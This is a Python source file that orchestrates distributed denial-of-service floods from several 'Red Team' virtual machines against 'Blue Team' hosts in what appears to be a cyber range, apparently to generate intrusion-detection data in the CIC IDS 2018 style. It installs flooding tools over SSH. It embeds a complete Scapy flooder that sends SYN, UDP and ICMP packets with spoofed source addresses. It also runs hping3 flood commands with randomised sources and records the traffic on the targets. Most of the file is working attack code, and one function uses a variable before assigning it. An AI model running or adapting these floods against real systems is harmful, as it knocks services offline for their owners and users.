"""
Distributed DDoS Attack Executor
Orchestrates coordinated DDoS attacks from multiple Red Team VMs against Blue Team targets
Based on CIC IDS 2018 methodology
"""

import paramiko
import asyncio
import json
import uuid
import logging
import os
from datetime import datetime
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
from pathlib import Path
import time
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# SSH Configuration - Load from .env file
SSH_USERNAME = os.getenv('SSH_USERNAME', 'mist')
SSH_PASSWORD = os.getenv('SSH_PASSWORD')
SSH_KEY_PATH = os.path.expanduser(os.getenv('SSH_KEY_PATH', '~/.ssh/cyber_range_key') or '')
SSH_PORT = int(os.getenv('SSH_PORT', '22'))

# Check if SSH key exists, otherwise fall back to password
if SSH_KEY_PATH and not os.path.exists(SSH_KEY_PATH):
    SSH_KEY_PATH = None

if not SSH_KEY_PATH and not SSH_PASSWORD:
    raise ValueError("SSH_PASSWORD must be set in .env file if SSH key is not available")

@dataclass
class AttackResult:
    """Store attack execution results"""
    attack_id: str
    attacker_vm: str
    target_ip: str
    target_port: int
    tool: str
    start_time: str
    end_time: Optional[str]
    status: str  # running, completed, failed
    packets_sent: int
    bytes_sent: int
    stdout: str
    stderr: str
    exit_code: Optional[int]
    captured_pcap: Optional[str] = None
    captured_netstat_log: Optional[str] = None

class SSHExecutor:
    """Execute commands on remote VMs via SSH"""

    @staticmethod
    def execute_command(hostname: str, command: str, timeout: int = 300, key_filename: Optional[str] = None) -> Dict[str, Any]:
        """
        Execute command via SSH and return results
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            logger.info(f"🔌 Connecting to {hostname}...")
            connect_kwargs = dict(
                hostname=hostname,
                port=SSH_PORT,
                username=SSH_USERNAME,
                timeout=30,
                allow_agent=True,
                look_for_keys=True,
            )
            if key_filename:
                connect_kwargs["key_filename"] = key_filename
            elif SSH_KEY_PATH:
                connect_kwargs["key_filename"] = SSH_KEY_PATH
            elif SSH_PASSWORD:
                connect_kwargs["password"] = SSH_PASSWORD
            # Determine auth method for logging
            if connect_kwargs.get("key_filename"):
                logger.info(f"Using SSH key auth: {connect_kwargs.get('key_filename')}")
            elif connect_kwargs.get("password"):
                logger.info("Using SSH password auth (from env) to connect")
            else:
                logger.info("Using agent/ssh-key lookup (no explicit key or password provided)")

            # Attempt connection
            ssh.connect(**connect_kwargs)

            logger.info(f"⚡ Executing: {command}")
            stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout)

            # Read output
            stdout_data = stdout.read().decode('utf-8')
            stderr_data = stderr.read().decode('utf-8')
            exit_code = stdout.channel.recv_exit_status()

            ssh.close()

            return {
                "success": exit_code == 0,
                "exit_code": exit_code,
                "stdout": stdout_data,
                "stderr": stderr_data,
                "hostname": hostname
            }

        except Exception as e:
            logger.error(f"❌ SSH execution failed on {hostname}: {str(e)}")
            return {
                "success": False,
                "exit_code": -1,
                "stdout": "",
                "stderr": str(e),
                "hostname": hostname
            }

    @staticmethod
    def check_connectivity(hostname: str, key_filename: Optional[str] = None) -> Dict[str, Any]:
        """
        Quick check if SSH connectivity works (runs 'echo ok' remotely). Returns dict with success and stdout.
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_kwargs = dict(
                hostname=hostname,
                port=SSH_PORT,
                username=SSH_USERNAME,
                timeout=10,
                allow_agent=True,
                look_for_keys=True,
            )
            if key_filename:
                connect_kwargs["key_filename"] = key_filename
            elif SSH_KEY_PATH:
                connect_kwargs["key_filename"] = SSH_KEY_PATH
            elif SSH_PASSWORD:
                connect_kwargs["password"] = SSH_PASSWORD
            ssh.connect(**connect_kwargs)
            stdin, stdout, stderr = ssh.exec_command("echo ok", timeout=10)
            out = stdout.read().decode("utf-8").strip()
            ssh.close()
            return {"success": True, "stdout": out}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def fetch_file(hostname: str, remote_path: str, key_filename: Optional[str] = None) -> Dict[str, Any]:
        """
        Fetch a file from a remote host using SFTP and return the binary content.
        """
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_kwargs = dict(
                hostname=hostname,
                port=SSH_PORT,
                username=SSH_USERNAME,
                timeout=30,
                allow_agent=True,
                look_for_keys=True,
            )
            if key_filename:
                connect_kwargs["key_filename"] = key_filename
            elif SSH_KEY_PATH:
                connect_kwargs["key_filename"] = SSH_KEY_PATH
            elif SSH_PASSWORD:
                connect_kwargs["password"] = SSH_PASSWORD

            ssh.connect(**connect_kwargs)
            sftp = ssh.open_sftp()
            with sftp.open(remote_path, "rb") as f:
                data = f.read()
            sftp.close()
            ssh.close()
            return {"success": True, "data": data, "remote_path": remote_path}
        except Exception as e:
            logger.error(f"❌ Failed to fetch file {remote_path} from {hostname}: {e}")
            return {"success": False, "data": b"", "error": str(e), "remote_path": remote_path}

class DDoSOrchestrator:
    """Orchestrate distributed DDoS attacks"""

    def __init__(self):
        self.active_attacks: Dict[str, AttackResult] = {}
        self.red_team_vms = {
            "generator": "10.72.200.62",
            "botnet1": "10.72.200.64",
            "botnet2": "10.72.200.65",
        }
        self.blue_team_targets = {
            "team1": "10.72.200.51",
            "team2": "10.72.200.54",
            "team3": "10.72.200.57",
        }

    def install_ddos_tools(self, vm_ip: str) -> Dict[str, Any]:
        """
        Install DDoS tools on a Red Team VM
        """
        logger.info(f"📦 Installing DDoS tools on {vm_ip}...")

        install_commands = '''
        # Update package list
        sudo apt-get update -y

        # Install hping3 for SYN/UDP floods
        sudo apt-get install -y hping3

        # Install slowloris
        pip3 install slowloris

        # Install slowhttptest
        sudo apt-get install -y slowhttptest

        # Clone GoldenEye
        cd /opt
        if [ ! -d "GoldenEye" ]; then
            sudo git clone https://github.com/jseidl/GoldenEye.git
            sudo chmod +x GoldenEye/goldeneye.py
        fi

        # Clone HULK
        if [ ! -d "hulk" ]; then
            sudo git clone https://github.com/grafov/hulk.git
            sudo chmod +x hulk/hulk.py
        fi

        # Install Python dependencies
        pip3 install requests scapy

        # Copy scapy_ddos.py (This assumes the file is available to be copied or created)
        # For simulation, we will create it directly on the VM
        cat << 'EOF' > /opt/scapy_ddos.py
#!/usr/bin/env python3
import sys
import time
import random
import argparse
import threading
import logging
import socket
import struct

# Suppress Scapy warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def get_random_ip():
    """Generate a random IP address."""
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def syn_flood(target_ip, target_port, num_packets):
    """
    Perform SYN Flood attack with spoofed source IPs.
    """
    for _ in range(num_packets):
        # Generate random source IP and port
        src_ip = get_random_ip()
        src_port = random.randint(1024, 65535)

        # Create IP packet with spoofed source
        ip_layer = IP(src=src_ip, dst=target_ip)

        # Create TCP SYN packet
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))

        # Send packet
        send(ip_layer/tcp_layer, verbose=0)

def udp_flood(target_ip, target_port, num_packets):
    """
    Perform UDP Flood attack with spoofed source IPs.
    """
    for _ in range(num_packets):
        src_ip = get_random_ip()
        src_port = random.randint(1024, 65535)

        ip_layer = IP(src=src_ip, dst=target_ip)
        udp_layer = UDP(sport=src_port, dport=target_port)
        # Random payload
        payload = Raw(b"X" * random.randint(64, 1024))

        send(ip_layer/udp_layer/payload, verbose=0)

def icmp_flood(target_ip, num_packets):
    """
    Perform ICMP Flood (Ping Flood) with spoofed source IPs.
    """
    for _ in range(num_packets):
        src_ip = get_random_ip()

        ip_layer = IP(src=src_ip, dst=target_ip)
        icmp_layer = ICMP(type=8, code=0) # Echo Request
        payload = Raw(b"X" * 32)

        send(ip_layer/icmp_layer/payload, verbose=0)

def attack_worker(target_ip, target_port, attack_type, packets_per_thread, stop_event):
    """
    Worker thread function to execute attacks.
    """
    while not stop_event.is_set():
        try:
            if attack_type == "syn":
                syn_flood(target_ip, target_port, 10)
            elif attack_type == "udp":
                udp_flood(target_ip, target_port, 10)
            elif attack_type == "icmp":
                icmp_flood(target_ip, 10)
        except Exception as e:
            logger.error(f"Error in worker: {e}")
            time.sleep(0.1)

def main():
    parser = argparse.ArgumentParser(description="Scapy DDoS Simulation Tool with IP Spoofing")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--type", choices=["syn", "udp", "icmp"], required=True, help="Attack type")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads (default: 4)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds (default: 60)")

    args = parser.parse_args()

    logger.info(f"Starting {args.type.upper()} flood on {args.target}:{args.port} with {args.threads} threads for {args.duration}s")

    stop_event = threading.Event()
    threads = []

    # Start threads
    for i in range(args.threads):
        t = threading.Thread(target=attack_worker, args=(args.target, args.port, args.type, 100, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    finally:
        stop_event.set()
        logger.info("Stopping attack...")
        for t in threads:
            t.join(timeout=1.0)
        logger.info("Attack finished")

if __name__ == "__main__":
    # Check for root privileges (needed for Scapy to send packets)
    if os.geteuid() != 0:
        logger.error("This script requires root privileges to send spoofed packets.")
        sys.exit(1)
    main()
EOF
        chmod +x /opt/scapy_ddos.py

        echo "✅ DDoS tools installation complete"
        '''

        return SSHExecutor.execute_command(vm_ip, install_commands, timeout=600)

    def execute_slowloris(self, attacker_vm: str, target_ip: str,
                          port: int = 80, sockets: int = 200,
                          duration: int = 300) -> str:
        """
        Execute Slowloris attack (Slow HTTP)
        """
        attack_id = str(uuid.uuid4())

        command = f"""
        timeout {duration} slowloris -s {sockets} -p {port} {target_ip} 2>&1 | \
        tee /tmp/slowloris_{attack_id}.log
        """

        logger.info(f"🐌 Launching Slowloris: {attacker_vm} → {target_ip}:{port}")
        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

        attack_result = AttackResult(
            attack_id=attack_id,
            attacker_vm=attacker_vm,
            target_ip=target_ip,
            target_port=port,
            tool="slowloris",
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat() if result["success"] else None,
            status="completed" if result["success"] else "failed",
            packets_sent=0,  # Slowloris uses few packets
            bytes_sent=0,
            stdout=result["stdout"],
            stderr=result["stderr"],
            exit_code=result["exit_code"]
        )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_http_flood(self, attacker_vm: str, target_ip: str,
                           port: int = 80, workers: int = 50,
                           sockets: int = 100, duration: int = 300) -> str:
        """
        Execute HTTP flood using GoldenEye
        """
        attack_id = str(uuid.uuid4())

        command = f"""
        cd /opt/GoldenEye
        timeout {duration} python3 goldeneye.py http://{target_ip}:{port} \
        -w {workers} -s {sockets} 2>&1 | tee /tmp/goldeneye_{attack_id}.log
        """

        logger.info(f"💥 Launching HTTP Flood (GoldenEye): {attacker_vm} → {target_ip}:{port}")
        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

        attack_result = AttackResult(
            attack_id=attack_id,
            attacker_vm=attacker_vm,
            target_ip=target_ip,
            target_port=port,
            tool="goldeneye",
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat() if result["success"] else None,
            status="completed" if result["success"] else "failed",
            packets_sent=workers * sockets * 100,  # Estimate
            bytes_sent=0,
            stdout=result["stdout"],
            stderr=result["stderr"],
            exit_code=result["exit_code"]
        )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_syn_flood(self, attacker_vm: str, target_ip: str,
                         port: int = 80, duration: int = 300) -> str:
        """
        Execute SYN flood using hping3
        """
        attack_id = str(uuid.uuid4())

        command = f"""
        sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target_ip} \
        2>&1 | tee /tmp/synflood_{attack_id}.log
        """

        logger.info(f"🌊 Launching SYN Flood: {attacker_vm} → {target_ip}:{port}")
        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

        attack_result = AttackResult(
            attack_id=attack_id,
            attacker_vm=attacker_vm,
            target_ip=target_ip,
            target_port=port,
            tool="hping3_syn",
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat() if result["success"] else None,
            status="completed" if result["success"] else "failed",
            packets_sent=100000,  # Estimate for flood
            bytes_sent=0,
            stdout=result["stdout"],
            stderr=result["stderr"],
            exit_code=result["exit_code"]
        )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_udp_flood(self, attacker_vm: str, target_ip: str,
                         port: int = 53, duration: int = 300) -> str:
        """
        Execute UDP flood using hping3
        """
        attack_id = str(uuid.uuid4())

        command = f"""
        sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target_ip} \
        2>&1 | tee /tmp/udpflood_{attack_id}.log
        """

        logger.info(f"🌪️ Launching UDP Flood: {attacker_vm} → {target_ip}:{port}")
        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

        attack_result = AttackResult(
            attack_id=attack_id,
            attacker_vm=attacker_vm,
            target_ip=target_ip,
            target_port=port,
            tool="hping3_udp",
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat() if result["success"] else None,
            status="completed" if result["success"] else "failed",
            packets_sent=100000,  # Estimate
            bytes_sent=0,
            stdout=result["stdout"],
            stderr=result["stderr"],
            exit_code=result["exit_code"]
        )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def execute_scapy_flood(self, attacker_vm: str, target_ip: str,
                           port: int = 80, attack_type: str = "syn",
                           duration: int = 300) -> str:
        """
        Execute Scapy-based flood with IP spoofing
        """
        attack_id = str(uuid.uuid4())

        command = f"""
        sudo timeout {duration} python3 /opt/scapy_ddos.py \
        --target {target_ip} --port {port} --type {attack_type} --duration {duration} \
        2>&1 | tee /tmp/scapy_{attack_type}_{attack_id}.log
        """

        logger.info(f"🌊 Launching Scapy {attack_type.upper()} Flood: {attacker_vm} → {target_ip}:{port}")
        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)

        attack_result = AttackResult(
            attack_id=attack_id,
            attacker_vm=attacker_vm,
            target_ip=target_ip,
            target_port=port,
            tool=f"scapy_{attack_type}",
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat() if result["success"] else None,
            status="completed" if result["success"] else "failed",
            packets_sent=0,  # Difficult to estimate without parsing logs
            bytes_sent=0,
            stdout=result["stdout"],
            stderr=result["stderr"],
            exit_code=result["exit_code"]
        )

        self.active_attacks[attack_id] = attack_result
        return attack_id

    def start_target_packet_capture(self, target_vm: str, target_port: int = 80, duration: int = 300) -> Optional[str]:
        """
        Start a tcpdump on the target machine capturing the selected port. Run in background and return remote pcap path.
        """
        ts = int(time.time())
        pcap_path = f"/tmp/ddos_capture_{ts}.pcap"
        # Ensure tcpdump is installed on the target
        self.ensure_tcpdump_on_host(target_vm)
        cmd = f"nohup sudo timeout {duration} tcpdump -i any port {target_port} -w {pcap_path} > /tmp/tcpdump_{ts}.out 2>&1 & echo $!"
        logger.info(f"📡 Starting tcpdump on {target_vm} -> {pcap_path} for port {target_port} (duration: {duration}s)")
        result = SSHExecutor.execute_command(target_vm, cmd, timeout=10)
        if result["success"]:
            return pcap_path
        else:
            logger.error(f"Failed to start tcpdump on {target_vm}: {result['stderr']}")
            return None

    def start_target_netstat_capture(self, target_vm: str, target_port: int = 80, duration: int = 300) -> Optional[str]:
        """
        Start periodic `ss -antp` logging on the target machine to record connections under /tmp
        """
        ts = int(time.time())
        remote_log = f"/tmp/ss_capture_{ts}.log"
        # Use a bash loop with timeout to capture every second
        cmd = (
            f"nohup sudo timeout {duration} bash -lc \"while true; do ss -antp | grep ':{target_port}' >> {remote_log}; sleep 1; done\""
            f" > /tmp/ss_capture_{ts}.out 2>&1 & echo $!"
        )
        logger.info(f"📡 Starting netstat (ss) capture on {target_vm} -> {remote_log} for port {target_port} (duration: {duration}s)")
        result = SSHExecutor.execute_command(target_vm, cmd, timeout=10)
        if result["success"]:
            return remote_log
        else:
            logger.error(f"Failed to start netstat capture on {target_vm}: {result['stderr']}")
            return None

    def fetch_remote_file(self, hostname: str, remote_path: str, dest_dir: str = "/tmp") -> Optional[str]:
        """
        Fetch a remote file to the local dest_dir by downloading via SFTP and writing locally with the same filename.
        Returns local path on success or None.
        """
        local_name = os.path.join(dest_dir, os.path.basename(remote_path))
        res = SSHExecutor.fetch_file(hostname, remote_path)
        if not res.get("success"):
            logger.error(f"Failed to download {remote_path} from {hostname}: {res.get('error')}")
            return None
        try:
            with open(local_name, "wb") as f:
                f.write(res["data"])
            logger.info(f"✅ Fetched {remote_path} from {hostname} to {local_name}")
            return local_name
        except Exception as e:
            logger.error(f"Failed to write local file {local_name}: {e}")
            return None

    def execute_distributed_attack(
        self,
        attack_type: str,
        target_team: str,
        target_port: int = 80,
        duration: int = 300,
        num_attackers: int = 3,
        capture_on_target: bool = True,
    ) -> List[str]:
        """
        Execute coordinated attack from multiple VMs
        """
        logger.info(f"🚀 Launching distributed {attack_type} attack on {target_team}")

        target_ip = self.blue_team_targets.get(target_team)
        if not target_ip:
            logger.error(f"❌ Unknown target: {target_team}")
            return []
        # Verify connectivity for target and attackers
        target_conn = SSHExecutor.check_connectivity(target_ip)
        if not target_conn.get("success"):
            logger.error(f"Target {target_ip} is not reachable: {target_conn.get('error')}")
            return []

        # Filter attacker_ips to ones we can reach
        reachable_attacker_ips = []
        for ip in attacker_ips:
            conn = SSHExecutor.check_connectivity(ip)
            if conn.get("success"):
                reachable_attacker_ips.append(ip)
            else:
                logger.warning(f"Attacker VM {ip} not reachable, skipping: {conn.get('error')}")
        if not reachable_attacker_ips:
            logger.error("No reachable attacker VMs. Aborting attack.")
            return []

        attacker_ips = reachable_attacker_ips

        # Optionally start captures on the target machine to verify the attack
        pcap_path = None
        netstat_log = None
        if capture_on_target:
            pcap_path = self.start_target_packet_capture(target_ip, target_port, duration + 5)
            netstat_log = self.start_target_netstat_capture(target_ip, target_port, duration + 5)
            # allow short warm-up time for tcpdump/ss loop
            time.sleep(1)

        # Select attacker VMs
        attacker_ips = list(self.red_team_vms.values())[:num_attackers]
        attack_ids = []

        # Launch attacks simultaneously from all VMs
        for attacker_ip in attacker_ips:
            try:
                if attack_type == "http_flood":
                    attack_id = self.execute_http_flood(attacker_ip, target_ip,
                                                       port=target_port, duration=duration)
                elif attack_type == "syn_flood":
                    attack_id = self.execute_syn_flood(attacker_ip, target_ip,
                                                      port=target_port, duration=duration)
                elif attack_type == "udp_flood":
                    attack_id = self.execute_udp_flood(attacker_ip, target_ip,
                                                      port=target_port, duration=duration)
                elif attack_type == "slowloris":
                    attack_id = self.execute_slowloris(attacker_ip, target_ip,
                                                      port=target_port, duration=duration)
                elif attack_type in ["scapy_syn", "scapy_udp", "scapy_icmp"]:
                    # Extract type from string (e.g., "scapy_syn" -> "syn")
                    scapy_type = attack_type.split("_")[1]
                    attack_id = self.execute_scapy_flood(
                        attacker_ip, target_ip, port=target_port, attack_type=scapy_type, duration=duration
                    )
                else:
                    logger.error(f"❌ Unknown attack type: {attack_type}")
                    continue

                # If tcpdump/netstat capture was started, attach their remote names to the result
                if pcap_path or netstat_log:
                    res = self.get_attack_status(attack_id)
                    if res:
                        # update internal AttackResult to include the remote paths (we will fetch them after attacks finish)
                        attack_obj = self.active_attacks.get(attack_id)
                        if attack_obj:
                            attack_obj.captured_pcap = pcap_path
                            attack_obj.captured_netstat_log = netstat_log

                attack_ids.append(attack_id)
                logger.info(f"✅ Started attack {attack_id} from {attacker_ip}")

            except Exception as e:
                logger.error(f"❌ Failed to launch attack from {attacker_ip}: {str(e)}")

        # After all attacks finished, fetch capture artifacts from the target (pcap, netstat) if available
        if capture_on_target and (pcap_path or netstat_log):
            local_pcap = None
            local_netstat = None
            if pcap_path:
                local_pcap = self.fetch_remote_file(target_ip, pcap_path, dest_dir="/tmp")
            if netstat_log:
                local_netstat = self.fetch_remote_file(target_ip, netstat_log, dest_dir="/tmp")

            # Attach local capture paths to each attack result for convenience
            for attack_id in attack_ids:
                attack = self.active_attacks.get(attack_id)
                if not attack:
                    continue
                if local_pcap:
                    attack.captured_pcap = local_pcap
                if local_netstat:
                    attack.captured_netstat_log = local_netstat

        return attack_ids

    def get_attack_status(self, attack_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a specific attack"""
        attack = self.active_attacks.get(attack_id)
        if attack:
            return asdict(attack)
        return None

    def ensure_tcpdump_on_host(self, hostname: str) -> bool:
        """
        Ensure tcpdump is installed on the host; attempts to install via apt-get if not present.
        Returns True if tcpdump is present or successfully installed.
        """
        # Check if tcpdump exists
        check = SSHExecutor.execute_command(hostname, "which tcpdump || echo 'MISSING'", timeout=10)
        if check["success"] and "MISSING" not in check["stdout"]:
            logger.debug(f"tcpdump already present on {hostname}")
            return True
        # Attempt to install tcpdump
        logger.info(f"Installing tcpdump on {hostname}...")
        install_cmd = "sudo apt-get update -y && sudo apt-get install -y tcpdump"
        res = SSHExecutor.execute_command(hostname, install_cmd, timeout=120)
        if res["success"]:
            logger.info(f"tcpdump installed on {hostname}")
            return True
        logger.error(f"Failed to ensure tcpdump on {hostname}: {res.get('stderr')}")
        return False

    def export_results(self, output_file: str):
        """Export all attack results to JSON"""
        results = [asdict(attack) for attack in self.active_attacks.values()]

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)

        logger.info(f"📊 Exported {len(results)} attack results to {output_file}")


# Example usage
if __name__ == "__main__":
    orchestrator = DDoSOrchestrator()

    # Install tools on all Red Team VMs
    print("\n=== Installing DDoS Tools ===")
    for vm_name, vm_ip in orchestrator.red_team_vms.items():
        print(f"\n📦 Installing on {vm_name} ({vm_ip})...")
        result = orchestrator.install_ddos_tools(vm_ip)
        if result["success"]:
            print(f"✅ Installation successful on {vm_name}")
        else:
            print(f"❌ Installation failed on {vm_name}: {result['stderr']}")

    # Example: Execute distributed HTTP flood
    print("\n=== Executing Distributed HTTP Flood ===")
    attack_ids = orchestrator.execute_distributed_attack(
        attack_type="http_flood",
        target_team="team1",
        target_port=9080,  # DVWA port
        duration=60,  # 1 minute test
        num_attackers=2  # Use 2 attackers
        , capture_on_target=True
    )

    print(f"\n✅ Launched {len(attack_ids)} distributed attacks")
    for attack_id in attack_ids:
        print(f"   - Attack ID: {attack_id}")

    # Wait for attacks to complete
    print("\n⏳ Waiting for attacks to complete...")
    time.sleep(70)

    # Check attack status
    print("\n=== Attack Results ===")
    for attack_id in attack_ids:
        status = orchestrator.get_attack_status(attack_id)
        if status:
            print(f"\n📊 Attack {attack_id}:")
            print(f"   Tool: {status['tool']}")
            print(f"   Target: {status['target_ip']}:{status['target_port']}")
            print(f"   Status: {status['status']}")
            print(f"   Exit Code: {status['exit_code']}")
            # Show capture artifacts if available
            if status.get('captured_pcap'):
                print(f"   Captured PCAP (local): {status.get('captured_pcap')}")
            if status.get('captured_netstat_log'):
                print(f"   Captured netstat log (local): {status.get('captured_netstat_log')}")

    # Export results
    output_file = f"/tmp/ddos_attack_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    orchestrator.export_results(output_file)
    print(f"\n💾 Results exported to: {output_file}")
